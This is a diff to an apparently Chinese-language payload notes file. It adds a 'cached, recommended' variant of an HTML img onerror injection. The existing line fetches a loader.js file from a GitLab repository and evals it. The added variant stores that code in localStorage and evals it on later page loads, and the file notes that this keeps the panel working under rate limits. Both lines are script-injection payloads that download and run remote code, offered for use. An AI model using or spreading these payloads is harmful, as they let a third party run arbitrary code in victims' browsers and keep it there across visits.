@@ -20,6 +20,14 @@
 <img src=x onerror="fetch('https://gitlab.com/api/v4/projects/88544686/repository/files/loader.js/raw?ref=main').then(r=>r.text()).then(eval)">
 ```
 
+## 2b. 带缓存 + 报错（推荐，限流时也能用）
+
+```html
+<img src=x onerror="let c=null;try{c=localStorage.getItem('fh:loader')}catch(e){};c?eval(c):fetch('https://gitlab.com/api/v4/projects/88544686/repository/files/loader.js/raw?ref=main').then(r=>{if(!r.ok)throw Error('HTTP '+r.status);return r.text()}).then(t=>{try{localStorage.setItem('fh:loader',t)}catch(e){};eval(t)}).catch(e=>alert('load fail: '+e.message))">
+```
+
+拉过一次之后就有缓存，之后即使 GitLab 限流也能直接开面板。清除缓存：`localStorage.removeItem('fh:loader')`。
+
 ## 3. 编码支持检测（录像/播放）
 
 ```html
